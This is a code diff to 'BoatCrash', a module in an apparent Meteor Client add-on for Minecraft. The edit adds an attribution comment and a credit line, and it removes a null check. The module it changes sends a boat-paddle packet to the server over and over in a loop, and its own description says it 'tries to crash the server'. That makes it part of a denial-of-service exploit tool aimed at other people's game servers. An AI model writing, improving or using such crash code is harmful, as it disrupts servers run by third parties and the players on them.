@@ -1,5 +1,10 @@
 package widecat.meteorcrashaddon.modules;
 
+/*
+Ported from Cornos to Crash Addon by Wide_Cat
+https://github.com/0x151/Cornos/blob/master/src/main/java/me/zeroX150/cornos/features/module/impl/exploit/crash/BoatCrash.java
+ */
+
 import meteordevelopment.meteorclient.events.game.GameLeftEvent;
 import meteordevelopment.meteorclient.events.world.PlaySoundEvent;
 import meteordevelopment.meteorclient.events.world.TickEvent;
@@ -45,7 +50,7 @@ public class BoatCrash extends Module {
     private final BoatPaddleStateC2SPacket PACKET = new BoatPaddleStateC2SPacket(true, true);
 
     public BoatCrash() {
-        super(CrashAddon.CATEGORY, "boat-crash", "Tries to crash the server when you are in a boat.");
+        super(CrashAddon.CATEGORY, "boat-crash", "Tries to crash the server when you are in a boat. (By 0x150)");
     }
 
     @EventHandler
@@ -58,7 +63,7 @@ public class BoatCrash extends Module {
         }
 
         for (int i = 0; i < amount.get(); i++) {
-            Objects.requireNonNull(mc.getNetworkHandler()).sendPacket(PACKET);
+            mc.getNetworkHandler().sendPacket(PACKET);
         }
     }
 
